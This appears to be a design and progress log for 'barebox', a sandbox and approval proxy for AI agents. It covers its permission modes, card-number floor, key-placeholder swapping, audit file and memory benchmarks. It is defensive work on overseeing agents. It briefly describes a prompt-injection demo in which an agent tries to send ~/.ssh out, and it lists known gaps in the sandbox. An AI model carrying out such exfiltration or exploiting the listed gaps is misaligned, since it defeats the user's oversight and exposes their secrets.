| Riskiest assumption | **Proxy memory with bareguard loaded stays within budget.** *Re-decided Oct 30: the budget is a range, about 145-175 MB in the full worst case at 40 agents (superseded Nov 2: about 205-245 MB over HTTPS, see M6); the 80 MB below is superseded. Measured 143.6 MB with bareguard 0.30.0 (B2c, see Evidence).* Round 1 of the memory POC (Oct 29, `docs/logs/findings.md`) put bareguard alone over 80 MB, with two flaws in the measurement. Round 2 (proxy in its own process) measured about 76.4 MB before bodies with `--max-semi-space-size=1` and 77.3 MB with 20 held bodies. Under 80 MB, measured (superseded: no real HTTP in that test). Second: the body check (see below). |
| Done when | See the list below. |
| Estimate | 1–1.5 days. |

**Design (decided Oct 29):**

*Letters vs modes.* The letter is per request. The mode is per run.

- **r**: read, no outside effect (GET/HEAD).
- **w**: reversible write, only where an rwxmap label says so.
- **x**: irreversible. Any non-GET request with no label is x.
- The mode picks which letters pass without asking. `ask`: r free, w and x ask. `auto` (default): r and w free, x asks. `trust`: r, w and x free.
- The floor (card numbers, payment paths) asks in every mode, `trust` included.

*Modes as bareguard config.* bareguard gains an optional `rwx.askUnheld` (array of letters, default `[]`, behaviour unchanged). A matched letter the agent does not hold that is in `askUnheld` goes to `askHuman` with rule `rwx.ask`. A letter not in `askUnheld` is still `rwx.denied`. An unlisted tool is `rwx.unlisted`. Children can only narrow it.

| Mode | rwx letters | askUnheld |
|---|---|---|
| `ask` | `r--` | `["w","x"]` |
| `auto` | `rw-` | `["x"]` |
| `trust` | `rwx` | `[]` |

*Memory (decided Oct 29).* The `sbx` proxy runs with `--max-semi-space-size=1`, set in the CLI's first line (`#!/usr/bin/env -S node --max-semi-space-size=1`). It caps the V8 young generation at 1 MB. Library embedders set their own Node flags, and the docs recommend this one. Latency with and without the flag was measured Oct 29 (`scripts/latency.mjs`, 2000 requests, 3 runs): p50 the same (about 0.8–1.0 ms); p95/p99 up to about 0.5 ms slower in 2 of 3 runs, the same in the third. See `docs/logs/findings.md`, "M3 — part A results".

*The queue.* Only requests that need the human's answer enter an agent's line. Allowed requests flow even while asks wait. Per agent: 1 held, up to 16 waiting unread (the bytes stay in the kernel socket buffer, not in proxy memory), and the next is refused at once with 429. Any deadline counts from arrival (`sbx run` has none by default; the library default is 120 s). On timeout it is denied with 403 "timed out", and a late answer is ignored. barebox never retries. Whether to try again is the agent's choice, and a retry is a new request with a new ask id.

*Gate facts (learned Oct 29).* `check()` returns allow or deny, never `askHuman`. After a human allow the rule is `humanChannel.allow`; after a deny the original rule stays. A null tool falls back to type `net` and is `rwx.unlisted`, so barebox always sends a tool. The audit config key is `audit.path`.

*Letters come only from config.* The gate never takes a letter from the caller. barebox sends `tool` = the rwxmap key for a labelled request, and `http.<METHOD>` (for example `http.GET`) for an unlabelled one. The committed rwx file, generated by barebox per mode, gives each its letter. Unlisted means deny. Rejected: granting rwx and passing the letter as a flag, because a mislabelled x would pass silently.

*Request keys.* rwxmap gains a light entry `rwxmap/match`: `matcherFrom([sidecar, ...]) → match(method, url) → { key, letter, marker, source: 'spec'|'request', tie }`. It never returns null. With no match it returns a request-only key in a stable documented format: `<host>.<METHOD> <path with ids as {id}>`, for example `api.anthropic.com.POST /v1/messages`. The per-vendor sidecar gains a top-level `servers` list (sidecars are regenerated with rwxmap 0.8.0). The letter rwxmap returns is informational; bareguard's file is authoritative. rwx measured the import at about +0.9 MB. The `rwxmap/discover` entry costs +14 MB and is out.

*Model endpoints.* barebox labels them r by policy, not rwxmap. rwxmap labels them x: for example `/v1/responses` with store can persist state, so r is a policy choice. barebox ships a small default list keyed by rwxmap request keys, user-extendable, written into the rwx file it generates: Anthropic `/v1/messages`; OpenAI-compatible `/v1/chat/completions` and `/v1/responses`; Ollama `/api/chat` and `/api/generate`; llama.cpp `/completion` and `/v1/chat/completions`.

*Audit.* No new primitive. Response status goes through `gate.record(action, {status,...}, {aid})`. barebox's own facts (request, wall denial) go through `gate.annotate({ surface:false, ... })`, into the same audit file.

*The floor as marks.* No new bareguard primitive. barebox runs its own regex and Luhn on the body and sets `cardLike: true` on the action. Config: `flags: { cardLike: { true: "ask" } }`. Flags run before the allowlist and rwx, so they ask in every mode. A flag can only add an ask or a deny, never grant. That is why a caller-set flag is safe and a caller-set letter is not. Payment paths (`/checkout`, `/payment`, `/orders`, `/purchase`, today a list in `src/run.js`) move to the same mark mechanism. The body never goes into the gate action. The audit file carries only the body length and a SHA-256 (see "The body check"); the masked 4 KB preview is in the ask file.

*The body check (final, decided Oct 29, later the same day).*

- Bodies up to 64 KB are read whole into the agent's working slot (one per agent, 64 KB, in memory), checked for card numbers, then decided. A card number turns the request into a floor ask (asks in every mode, `trust` included). Nothing is ever denied because of a card.
- A request to a model endpoint is never card-scanned (user, Nov 2); `policy.js` owns the set (`modelTools`). `paymentPath` is unchanged.
- Bodies over 64 KB stream through unchecked for card numbers. They still get the normal letter and mode decision from URL and headers. Why: random 16-digit numbers starting 2–6 pass Luhn about 1 time in 10, so checking and denying large uploads would break uploads full of ids.
- A body of 64 KB or less is read in the working slot for every request, before the gate decides, whatever the URL and headers would decide alone (corrected Oct 30: the built proxy does not leave a body unread when the URL already means ask).
- The scanner (`src/cardscan.js`, built and tested Oct 29): 13–19 digits, optional single space or dash separators, touching no other digit, first digit 2–6 (excludes millisecond timestamps), then Luhn. It keeps a 40-byte tail between chunks and finds a card followed by a CVV. Card detection gets no more rounds: further wrinkles go to the fix ledger.
- Held bodies (any request waiting for the human, card asks and x asks) are written to a file in the owner-only runtime folder, never kept in memory. Cap 50 MB (config key `heldBodyMaxMB`, in the one config file). Over the cap: 403 "body too large to hold". The file is deleted once the ask is decided or abandoned. Why: a held body kept in memory up to 1 MB (today) is 20 MB at 20 agents, over budget, and a 64 KB cap would make `git push` impossible to approve.
- A card ask waits in the agent's line like any other ask (1 held, up to 16 waiting).
- Memory: one 64 KB working slot per agent, 20 agents = 1.25 MB. Superseded Oct 30: the round 2 figure (77.3 MB) and the 28-agent estimate were wrong, since that test had no real HTTP. Measured in B2c: 99.5 / 114.4 / 124.3 / 143.6 MB at 10 / 20 / 30 / 40 agents in the full worst case (about 1.4 MB per agent), so the cap is 40 agents per proxy under a 150 MB budget, enforced by `addAgent`.
- The audit file no longer stores bodies or a preview (superseded Oct 30: it was whole bodies, then a 4 KB preview per request line). A request with a body gets one `body` annotate line: `meta: { agent, rid, bodyBytes, bodySha256 }`, joined to its gate line by `rid`. The 4 KB masked preview (card numbers masked except the last 4) is in the ask file only. User decision, Oct 30.
- Known gap: API keys or passwords inside a body still appear in the ask file's preview (the audit file has no preview). bareguard's redaction covers common token shapes once it lands. barebox does not build its own secret scrubber.
- Known gap: compressed (gzip) bodies are not checked.

**Part B2a, done (Oct 30), brief `docs/logs/m3-b2a-labels-brief.md`.** Decided by the user Oct 30:
- *The gate file's letters win.* The letters come only from `<v>.rwxmap.json`'s `bareguard.tools` (the file the user reviews and can edit); rwxmap's guessed letter is never used. A spec key the gate file lacks is denied (fail closed).
- *Key names.* `labels` (folders the rwxmap CLI wrote) and `tenants` (vendor -> server URLs, replacing placeholder hosts) in the one config file. Label folders are masked inside the sandbox.
- *Tool order.* Spec key when a label documents the request, else a model endpoint key (`r`), else `http.<METHOD>`. Model endpoints: Anthropic `/v1/messages`, `/v1/messages/count_tokens`; OpenAI `/v1/chat/completions`, `/v1/responses`, `/v1/embeddings`; each `localLlm` host:port `/api/chat`, `/api/generate`, `/api/embed`, `/v1/chat/completions`, `/v1/completions`.
- *Correction to B1 (content defaults).* bareguard's zero-config content word patterns scanned the URL and method before the mode letters. In every mode, `trust` included, they made PUT/PATCH/DELETE ask, made GETs with words like "remove" or "drop" ask, and denied a URL containing "TRUNCATE TABLE". `gateFor` now passes `content: { askPatterns: [], denyPatterns: [] }`, so the modes table is what happens. Evidence: found by the B2a worker's tests 4, 6 and 7, reproduced by the orchestrator against `c09283e`; details in `docs/logs/findings.md`, "M3 — B2a labels".
- New dependency `rwxmap` 0.8.0 (exact). Verified: full suite 421/421 three times, 0 skip, typecheck clean; an `sbx run` smoke with an httpbin label folder (labelled PUT `w` passed in `auto` with no ask; unlabelled PUT asked, denied, 403; both PUTs 200 in `trust`; label folder not visible in the sandbox).
- **B2c, done (Oct 30), brief `docs/logs/m3-b2c-bench-brief.md`:** `npm run bench:agents` measures 10 / 20 / 30 / 40 agents in the full worst case: 99.5 / 114.4 / 124.3 / 143.6 MB with bareguard 0.30.0, walls max 8.0 MB. It found two causes of 318 MB at 20 agents (bareguard re-reading the audit file per ask, fixed upstream for 0.30.0; barebox keeping held bodies in memory, fixed). The user re-decided the budget at 150 MB and capped agents at 40 per proxy. Details in Evidence and `docs/logs/findings.md`.
- **B2b, done (Oct 30), brief `docs/logs/m3-b2b-audit-brief.md`:** `gate.jsonl` is the one audit file, every line in bareguard's shape through a bareguard Gate (`record` for response status, `annotate` with `surface:false` for barebox's facts, `drainAnnotations()` after each). A body is logged as one `body` line (length + SHA-256, joined by `rid`); request headers and the preview are no longer logged (the preview is in the ask file only). Verified in a real shell: suite 432/432 three times, 0 skip; typecheck clean; live smoke (labelled PUT, asked-then-approved POST): one file, aid joins, correct hash, no secret in the file. Details in `docs/logs/findings.md`, "M3 — B2b one audit file".

**We build:**
1. **The action barebox hands the gate**: `{ type: "net", tool: <rwxmap request key, or http.<METHOD>>, url, method, agent, cardLike?, paymentPath? }`. No letter.
2. **The rwx file generator**: per mode, from rwxmap labels plus the default model-endpoint list.
3. **`ask` / `auto` / `trust` as bareguard config** (rwx letters + `askUnheld` + the flags for the floor).
4. **The body checker**, the 64 KB working slot per agent, held bodies in files, and the masked 4 KB preview (see "The body check").
4a. **The config file**: `${XDG_CONFIG_HOME:-$HOME/.config}/barebox/config.json`, read by the CLI only. Keys today `mode`, `holdTimeoutSec`, `heldBodyMaxMB`, `localLlm`, `labels`, `tenants`, `env` and `secrets`; later modules add keys to the same file, no second user config file. A flag beats the file, the file beats the default. An unknown key, bad value or bad JSON makes `sbx run` exit 2 naming the file and key. It is hidden inside the sandbox (it reads empty); the mask must follow the resolved path, so a custom `XDG_CONFIG_HOME` under `$HOME` is hidden too (fixed in the body brief). Built Oct 29 (part A).
5. **The `gate` option**: none means a preset; otherwise a passed bareguard `Gate` or any object with the same `check(action)` contract. Matched by shape.
6. **Audit** through `gate.record` and `gate.annotate`.
7. **Reuse instead of barebox's own copies**:
   - barebox's `denyReasonForIp` already covers every embedded form: mapped (`::ffff:7f00:1`, `::ffff:127.0.0.1`), compat, uncompressed `0:0:0:0:0:0:0:1`, NAT64 `64:ff9b::/96` and 6to4 `2002::/16`, with public sites behind NAT64/6to4 still reachable. It stays. Adopting bareguard's `isPrivateIp` (F4) is not in this release.
   - bareguard's redaction replaces barebox's `SENSITIVE_HEADERS` scrub.
8. **The Node flag**: the CLI's first line sets `--max-semi-space-size=1`, plus a latency comparison with and without it.

**Done when:**
- A scripted request set gets the expected decision in each of the three modes, for each rule, including a case that should not match.
- The floor asks in `trust`, for a small body and for a body split across chunks. A body up to 64 KB with a card becomes an ask; a large body streams through unchecked and completes. A held body is a file, deleted once the ask ends; over `heldBodyMaxMB` it gets 403.
- A passed loop gate receives the asks (barebox's file channel stays silent).
- A vanilla `check()` object works.
- The audit log shows request, decision and response status in one file.
- The memory bench uses the round 2 method (proxy in its own process, GC forced before each reading, the real gate and matcher loaded) and measures 10, 20, 30 and 40 agents with every working slot filled, so the agent limit is measured, not estimated. **Done Oct 30:** recorded against 175 MB at 40 agents (the user retired 80 MB); see "M3 B2c memory bench" in Evidence. The agents bench needs bareguard 0.30.0 to meet 150 MB.
- The latency comparison with and without `--max-semi-space-size=1` is recorded.

**Suite friction**: per the suite reuse rule, these are fixed in the owning library, never patched here. Status as of Oct 29.

| # | Library | Gap | Needed by | Status |
|---|---|---|---|---|
| F1 | bareguard | `rwx.askOn` accepts only `"none"` or `"loose"`; a letter above the ceiling is denied, not asked. | M3 | **Resolved by bareguard**, agreed with the bareguard maintainer session and approved by the user: new optional `rwx.askUnheld` (see "Modes as bareguard config"). bareguard 0.29.0 is released and verified against npm; barebox depends on it exactly. A new bareguard ruling (#70). **Accepted Oct 29:** `askUnheld` at bareguard commit `fb0bd74` passed barebox's acceptance test (`poc/m3/askunheld.mjs`, 16/16; against 0.28.0 the same script fails 8). The test drives the gate directly with the proxy's action shape, not through the proxy's HTTP path. B1 wires it through the proxy's HTTP path. |
| F2 | rwxmap | Labels are keyed `<vendor>.<operationId>`, but the proxy sees `METHOD` + URL. | M3 | **Resolved by rwxmap**, approved by the user: new entry `rwxmap/match` (see "Request keys"). Ships in rwxmap 0.8.0 (branch `feat/match-entry`, target Oct 31). rwxmap's bars: 0 differences vs `classifyCall` on its four corpora, import ≤ 1.5 MB, no slower per match, the fail-closed fallback tested by breaking it. |
| F3 | bareguard | barebox's transport lines must land in the gate's audit file. | M3 | **Resolved, no new primitive**: `gate.record` for response status, `gate.annotate({ surface:false, ... })` for barebox's own facts (built in B2b on 0.29.0). Asks for bareguard 0.30.0, shape agreed with the guard session Oct 30 (not built; needs the user's approval there; no date): a 256-fact cap on buffered annotations (`surface:false` evicted first, with an `annotate_dropped` phase); an oversize `meta` drops whole keys, largest first, with `_droppedKeys`, also at the 3500-byte line cap; docs only for the content defaults. barebox keeps calling `drainAnnotations()` even then (256 facts could reach about 350 KB per gate) and can drop its 900-byte fallback once 0.30.0 is pinned. |
| F4 | bareguard | `isPrivateIp` misses NAT64, 6to4 and the uncompressed `::1` (verified against 0.27.0; barebox's wall covers them). | — | **Not in this release.** barebox's wall already covers all three. bareguard's view: Node's `new URL()` already shortens uncompressed `::1`, so that miss only bites raw-string calls. See `docs/logs/bareguard-isprivateip-spike.md`. |

### M4. Undo layer

| | |
|---|---|
| Goal | Every file write is reviewable and reversible. |
| We use | bwrap overlay (`--overlay-src` / `--overlay`, bubblewrap >= 0.11.0; an older bwrap is refused with a clear message, runs without the overlay still work). |
| We build | An overlay upper per run. `sbx diff`, `sbx commit`, `sbx rollback`. Handling of deletions (overlay whiteouts). Detection of files the user changed meanwhile: on conflict, refuse or flag. |
| Riskiest assumption | Commit applies the upper layer to the real folder correctly, including deletions and files changed meanwhile. |
| Done when | A run that edits, creates and deletes files commits to the correct result. Rollback leaves the folder as it was. A file changed by the user mid-run is flagged, not overwritten. |
| Estimate | 1 day. |

### M5. Keys the agent never holds

| | |
|---|---|
| Goal | The agent works with a placeholder. The real key never enters the sandbox. |
| We build | A placeholder inside the sandbox. The real value is added to request headers only after approval. Per-agent credentials. |
| Riskiest assumption | The key is never visible inside the sandbox (env, files, process list), and a denied request carries only the placeholder. |
| Done when | An approved request reaches an API with the real header value. A denied one carries only the placeholder. A search of the sandbox for the real value finds nothing. |
| Estimate | 0.5 day. |

**M5 interview, round 1 (user, Oct 31; all recommendations accepted).**

- *Scope:* M5 protects API keys sent in a request header to a service (Stripe, GitHub, Jira, Anthropic or OpenAI API keys). The agent's own sign-in (Claude Code's subscription login in `~/.claude`) is out of 0.6.0: those tokens refresh themselves; `~/.claude` stays readable and is a known gap.
- *Host environment:* cleared. Measured Oct 31: today all 115 host variables reach the sandbox (`FAKE_API_KEY=sk-test-123 sbx run -- env` shows it), including `CLAUDE_CODE_MESSAGING_TOKEN` and `SBX_RUNTIME`; the ssh-agent and D-Bus sockets do not (`/run/user/<uid>` is not mounted). The inside gets barebox's own variables (`HOME`, `PATH`, the proxy and CA variables), a short default pass list (`TERM`, `COLORTERM`, `LANG`, `LANGUAGE`, `LC_*`, `TZ`, `USER`, `LOGNAME`, `SHELL`, `EDITOR`, `PAGER`), config `env.pass` names, config `env.set` values, and one placeholder per configured secret. Proposed guard (not yet decided): `env.pass` refuses secret-looking names (`*KEY*`, `*TOKEN*`, `*SECRET*`, `*PASSWORD*`) with "use `secrets` for this".
- *Where keys live:* config `secrets`, each entry naming a host environment variable (`fromEnv`) by default, or holding the value inline (the config file is 0600 and masked). No OS keyring.
- *When the real value goes in:* on any request the gate allows (by mode or by your approval), and only to the hosts that secret is bound to. A denied request, or one to any other host, carries the placeholder.

**M5 interview, round 2 (user, Oct 31).**

- *Placeholder:* random, made fresh per run, one per configured secret, under the secret's usual variable name. It lets tools start and send their auth header; the proxy finds it in a header and swaps in the real value only for an allowed request to a bound host. Seen headed anywhere else, it is a tripwire.
- *Keys per agent:* one shared `secrets` set for every agent on the proxy for now; per-agent keys later, when needed, without changing this design.
- *Audit:* no new file. Swap facts go into `<runtime>/gate.jsonl`, the one bareguard-shape file the suite shares, as `annotate` lines (`verdict: "secret"`, `meta: { agent, rid, name, host, swapped }`), joined to the gate line by `rid`. Never the value.

**M5 interview, round 3 (user, Oct 31).** `env.pass` refuses secret-looking names (`*KEY*`, `*TOKEN*`, `*SECRET*`, `*PASSWORD*`, case-insensitive) at startup with "use `secrets` for this"; no override (`env.set` covers a harmless match). A placeholder headed for a host its secret is not bound to is blocked: `403 denied: secret.host`, plus the audit line, in every mode.

**M5 spec (decided Oct 31).**

| | |
|---|---|
| Problem | Every host environment variable reaches the sandbox today (115 measured), so any exported API key is readable by the agent. |
| Goal | The agent holds only placeholders. The proxy, outside the sandbox's pid namespace, adds the real value to request headers on allowed requests to bound hosts. |
| Go/no-go (POC) | With a secret configured: the real value appears 0 times inside the sandbox (environment of every process, `/proc/*/environ`, `/proc/*/cmdline`, every readable file under `/` except `/proc` and `/sys`, the CA bundle); an allowed request to the bound host arrives upstream with the real value; a denied one, and one to an unbound host, never carry it; the unbound one is blocked `403 secret.host`. Each check must be shown able to fail. |
| Config | `env: { pass: [names], set: { name: value } }` and `secrets: { NAME: { fromEnv: "HOSTVAR" \| value: "...", hosts: ["api.stripe.com"] } }` in the one config file; unknown keys and a missing `fromEnv` variable fail at startup (exit 2). |
| Environment inside | barebox's own variables, the default pass list, `env.pass`, `env.set`, one random per-run placeholder per secret under its own name. Nothing else. |
| Swap | Every request header value is searched for each placeholder (substring, so `Bearer <ph>` works). Gate allows, the host is bound and the upstream hop is https: replace with the real value. Denied: the placeholder never leaves (the request does not go upstream). Unbound host: `403 secret.host`; bound host over plain http: `403 secret.scheme`. Never in the audit, the ask file or an error body. |
| Audit | `annotate` lines in `gate.jsonl`, `verdict: "secret"`, `meta: { agent, rid, name, host, swapped }`. |
| Out of scope to Nov 4 | Swaps in bodies, URLs or query strings (a placeholder in a URL is refused `403 secret.url` after 0.6.0); OAuth, refresh tokens and the agent's own sign-in (`~/.claude` stays readable, a known gap); macOS; a web UI; per-agent keys. |
| Open | None. `run()` and `createProxy()` take `secrets` directly; the CLI reads them from the config file (decided after the POC). |

**M5 POC result (Oct 31): GO.** Checks A–G pass in a real shell, each shown red by its mutation (details in `docs/logs/findings.md`, "M5 — POC"). Build decisions (user, Oct 31, all recommendations accepted):

- `run()` and `createProxy()` take `secrets`; the CLI reads them from the config file and passes them in. One path for both.
- The swap also decodes `Authorization: Basic <base64>`, swaps and re-encodes (`curl -u KEY:`, Stripe's documented style).
- The launcher spawns bwrap with a clean environment (`env: { PATH: '/usr/bin:/bin' }`) and sets everything with `--setenv`. No `--clearenv`: proven redundant, and bwrap's own `/proc/1/environ` is what the clean spawn fixes.
- Tests cover check C with a small fixture `$HOME` searched from inside; the full-filesystem search stays a manual POC script (`poc/m5`, 7 minutes).
- The 0.6.0 ledger brief (`docs/logs/ledger-060-brief.md`) is built first, in separate commits on `m5`, then the M5 build (`docs/logs/m5-build-brief.md`).

**M5 built (Nov 1, branch `m5`; released as 0.6.0).** `src/secrets.js` (`loadSecrets`, `findPlaceholders`, `applySecrets`), config keys `env` and `secrets`, `launch({ env })`, `createProxy({ secrets })`, and `run({ secrets, env })`; `sbx run` passes the config through. Detect runs before the gate, apply only after `allow` (and on the no-gate path), so the real value is never in a held request's headers. 41 new tests (secrets 11, config 6, launcher 5, proxy 16 in `test/m5.test.mjs`, run/CLI 3); the suite is 491 of 491, 0 fail 0 skip, in a real shell at the branch review (485 of 485 three times at the first build). Build decisions: the launcher looks `bwrap` up on the caller's `PATH` but starts it with `PATH=/usr/bin:/bin` (so the fake `bwrap` the launcher tests put first on `PATH` still works); `NODE_USE_ENV_PROXY=1` is set inside with the proxy variables (the host environment no longer reaches the sandbox, and Node's built-in `fetch` ignores the proxy variables without it; Node added the variable in v22.21.0). Known gaps: `~/.claude` stays readable; an upstream that echoes a request header hands the real value back to the agent. Check C (the 7-minute full-filesystem search) and the real Stripe/httpbin smoke are run by the orchestrator.

**After 0.6.0 (branch `chore/fix-ledger`, unreleased).** Node's `fetch` of an `http://` URL tunnels plain HTTP with `CONNECT` (`NODE_USE_ENV_PROXY=1`): the first byte inside a tunnel decides (`0x16` = TLS, decrypted; anything else is plain HTTP, checked like any request), and a certificate is minted only for a TLS tunnel. A placeholder in a URL path or query is refused `403 denied: secret.url` in every mode. The host's Node (`hostNode` in `src/runtime.js`) is bound read-only when it lives outside `/usr`, `$HOME` and the project, with its `bin` dir first on the inside `PATH`; never when its install dir is `/`, `$HOME` or above (`sbx run` says so on stderr). Locked drawers and `maskDirs` folders under any bound root (`/etc`, `/usr`, the Node install) are masked, and so is the runtime tree: a runtime under any bound root gets an empty mask (no `asks/`, `answers/` or `socks/` inside), and `launch()` throws when the runtime IS `/etc`, `/usr` or the Node install dir (its sockets cannot be hidden there). The Node install is bound before `$HOME` and the project, so a project under it keeps its overlay writable. CI runner setup is one script, `scripts/ci-runner-deps.sh`.

### M6. Scale run

| | |
|---|---|
| Goal | Check the memory targets at the real scale. |
| What | 20 agents plus the shared proxy on one box, and on a 2 GB VPS if one is available. Compare with the memory targets. |
| Note | If M0 and M1 measurements already cover this, fold it into them and record the numbers there. It is then not a separate step. |
| Method | The M3 round 2 bench: proxy in its own process, GC forced before each reading, the real gate and matcher loaded, 10, 20, 30 and 40 agents with every working slot filled. |
| Estimate | No separate estimate. It is part of the 9–10 day total. |

**Spec (interview with the user, Nov 2).** The M3 bench sends plain HTTP only; real agent traffic is almost all HTTPS (model API, GitHub, npm), and so are the writes that get held. The MITM path at scale (CONNECT, a minted cert, a live TLS session per tunnel, a secret swapped in) was never measured.

| | |
|---|---|
| Decision (go/no-go) | The proxy stays at or under 175 MB at 40 agents when the traffic is HTTPS. |
| Worst case | Today's worst case (per agent: 1 parked hold, 16 waiting, the working slot filled) with every request in its own live MITM TLS tunnel: about 18 TLS sessions per agent, 720 at 40 agents, over 10 hosts shared by all agents (certs minted and cached), one secret swapped per request. The plain-HTTP run stays and is reported beside it. |
| 2 GB | The 20-agent case runs inside a 2 GB memory cgroup on the dev box (`systemd-run --user -p MemoryMax=2G`); nothing may be OOM-killed. No VPS. |
| Real agent | One real Claude Code on a small task, inside barebox and without it: "barebox adds X MB to a real agent". The 40-agent bench stays on stub agents. |
| Over budget | Stop and bring it to the user with where the memory goes (TLS buffers, cert cache, other). No tuning inside M6. |
| Out of scope | Start time (an M7 number). macOS and Windows (Linux only). |
| Riskiest assumption | A live Node TLS socket holds tens of KB; 720 of them could add 30-50 MB to the 145 MB plain worst case. POC first: proxy RSS with 720 live MITM tunnels before the bench is extended. |

**POC result (Nov 2, `poc/m6/`): the go/no-go failed at 175 MB.** 40 agents, worst case, 1120 live TLS sessions (400 keep-alive allow tunnels, one per agent and host, plus 720 held/waiting/working tunnels), every allow's secret swapped (3600/3600). VmRSS after forced GC:

| 40 agents | after 3600 allows | worst case | native outside V8 |
|---|---|---|---|
| Plain HTTP (the M3 bench) | 87.1 | 147.1 MB | 104 MB |
| HTTPS, POC as first built (`upstreamCa`) | 195.9-216.9 | 279.2-296.7 MB | 231-247 MB |
| HTTPS, production trust path (test CA via `NODE_EXTRA_CA_CERTS`) | 135.8 | 240.8 MB | 193 MB |
| HTTPS, production trust + one MITM `SecureContext` per host | 120.9 | 203.6 MB | 161 MB |

- About 40 MB of the first reading was the test setup: `upstreamCa` makes every new upstream TLS connection build a context from ~145 roots plus the test CA (`trust` in `src/proxy.js`); production passes none.
- About 37 MB is a real per-tunnel cost: each MITM tunnel built its own context from the PEM files (`new tls.TLSSocket(sock, { key, cert })`). One cached context per host removes it.
- The rest, about 50 KB per live TLS session, is OpenSSL's per-connection state; no cache removes it. With the cache: about 2.9 MB per agent at the proxy in this worst case (116.0 MB at 10 agents, 203.6 MB at 40). Walls stay 7.8-8.0 MB.

**Decision (user, Nov 2; the range is replaced by the later decision below):** fix and re-budget. The MITM context is cached per host in `src/proxy.js`. The proxy budget becomes **about 200-230 MB in the full HTTPS worst case at 40 agents** (a range for machine load, like the old 145-175 MB plain range, which it replaces). The 40-agent cap stays. `bench:agents` measures the HTTPS worst case on the production trust path.

**Built and measured (Nov 2).** With the cache in `src/proxy.js`, `npm run bench:agents` (HTTPS worst case, production trust path, every allow's secret swapped):

| Agents | quiet machine (load 5.5) | busy machine (load 12-17) | live TLS at worst |
|---|---|---|---|
| 10 | 117.3 MB | 117.9 MB | 280 |
| 20 | 133.5 MB | 151.3 MB | 560 |
| 30 | 176.9 MB | 206.8 MB | 840 |
| 40 | 206.6 MB | 241.0 MB | 1120 |

Walls 7.8-8.1 MB. Same code, same bench: the difference is machine load (native TLS memory is released later on a busy box), the same pattern as the plain range (143-172 MB). Drift at 20 agents over 7200 more TLS allows: +1.2 MB quiet, +5.4 MB busy.

**2 GB check (Nov 2): pass.** The whole HTTPS bench (10, 20, 30 and 40 agents) ran inside a 2 GB memory cgroup with swap off (`systemd-run --user --scope -p MemoryMax=2G -p MemorySwapMax=0`): exit 0, proxy 116.4 / 141.0 / 179.9 / 207.2 MB, walls 8.0 MB, cgroup `memory.peak` 527 MB for everything (proxy, 40 sandboxes, the bench and its 1120 client TLS sockets), `oom_kill 0`. A first try as a systemd service (not a scope) died on a TLS handshake after 9 s at 99 MB, not OOM: a service gets a stripped environment; the scope keeps the caller's.

**Real agent (Nov 2).** Claude Code 2.1.316, `claude -p` "summarise README.md in 3 lines", auto mode, `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` in both runs; exit 0 every time, about 7-16 s each. Peak RSS (`VmHWM`, polled from the host's `/proc`): Claude Code 249 MB bare and 248 MB inside barebox (2 runs each); the `sbx` process with its in-process proxy 83 MB (2 runs); walls about 8 MB (bench figure). So barebox adds about 91 MB to one real agent and does not change the agent's own memory; the proxy is shared, so each further agent adds about 8 MB of walls plus about 3 MB at the proxy. Whole-cgroup peaks (`memory.peak`) read lower inside (288 vs 321-346 MB) because they count page cache, and bare Claude Code writes its session files under `~/.claude`, which is read-only inside; they are not used for the number.

Findings from the real-agent run (not fixed in M6):
- `claude` is not on the inside `PATH`: the native installer puts it in `~/.local/bin`, and the sandbox's `PATH` is the system `PATH` plus the bound Node's `bin`. `sbx run -- claude` exits 127 `claude: not found`; the binary itself is visible (via the `$HOME` bind), so `sbx run -- ~/.local/bin/claude` works.
- `/bin`, `/sbin` and `/lib` did not exist inside on merged-`/usr` hosts (only `/lib64` was recreated): `#!/bin/sh` scripts and Node's `child_process.exec` failed (`spawn /bin/sh ENOENT`), in every release so far. Decision (user, Nov 2): fix before Demo B by mirroring the host's top-level links. `~/.local/bin` is now appended to the inside `PATH` when it exists (user decision, Nov 2).
- Lead, not reproduced as a barebox bug: under `sbx run -- /usr/bin/time -v claude -p ...`, `time`'s report stops at the same byte both times and the run exits 1, although Claude Code finished; `time -v true` and 300 lines of output pass intact inside.

**Decision (user, Nov 2, replaces the 200-230 MB above):** the proxy budget is **about 205-245 MB in the full HTTPS worst case at 40 agents, quiet to busy machine**. The bench fails above 245 MB.

### M7. Demos, numbers, README

| | |
|---|---|
| Demo A | Flight booking. Search runs free. Payment stops for approval. The key is never in the agent. Use an API whose key goes in a header, for example Stripe test mode. Decision (user, Nov 2): httpbin stands in for Stripe (no account, deterministic); the key swap shows in httpbin's echo. Built on branch `m7`, after m6 merges. |
| Demo B | A prompt-injected agent tries to read `~/.ssh` and push it out. Blocked. Good work is committed. Bad edits are rolled back. |
| Numbers | Start time. Memory per agent. Prompts per task versus a stock agent setup. Blocked exfiltration attempts. |
| Also | README. |

**Decisions (user, Nov 2), from running Demo B live:**
- Answering a hold from a second terminal (env var, temp path, `rule=` codes) was too technical. `sbx run` now asks in its own terminal, in plain words (`⏸ <name> wants to SEND data to <host>`, why, URL, masked data, `Allow? [y/N]`), when stdin and stderr are terminals and `--json` is off. A key typed before a question opens never answers it. A second terminal (`sbx approve/deny`) still works, and the first answer wins. Both write through the one answer writer.
- One `sbx run` is one sandbox with one agent, so the user names the sandbox: `sbx run --name <n>` sets the agent name and a fixed runtime dir (`$XDG_RUNTIME_DIR/barebox/<n>`, else `<tmpdir>/sbx-<uid>/<n>`), and every other command takes `--name` instead of `SBX_RUNTIME` (giving both is an error).
- Demo B is `examples/demo-b/run.sh`: one 10-step workflow under ask, auto and trust, asserting every cell, plus two agents at once for commit and rollback. The scripted driver is the proof. The `claude -p` driver is best effort: the API's own safeguards (`[cyber]`) refuse the injection text, so a real agent runs only the legitimate steps.

**Decisions (user, Nov 3), Demo A and M7 scope:**
- Demo A is `examples/demo-a/run.sh`, built like Demo B: run by hand, not in `npm test` or the tarball. The scripted driver asserts every step and exits 1 on any FAIL. `--driver claude` is best effort, and `--live` lets the user answer the prompts.
- Steps: search, pay, email. The search is `GET httpbin /anything/search` and runs free. The payment is `POST /anything/v1/payment_intents`: its path holds `/payment`, so the floor holds it, and the key appears in httpbin's echo only after approval. The itinerary email is a second hold.
- Modes: all three, chosen at start with `--mode ask|auto|trust|all`, as in Demo B. Expected: search free in every mode; payment held in every mode (floor); email held in ask and auto (`x`), free in trust.
- Scope: Demo A, the README numbers, and four fix-ledger items (user, Nov 3): a late `sbx approve` prints "approved" for an already-decided hold; a mistyped `--name` says "nothing held"; a stale half-typed answer can approve the next hold (its test misses it); the README's Node-location sentences are stale.
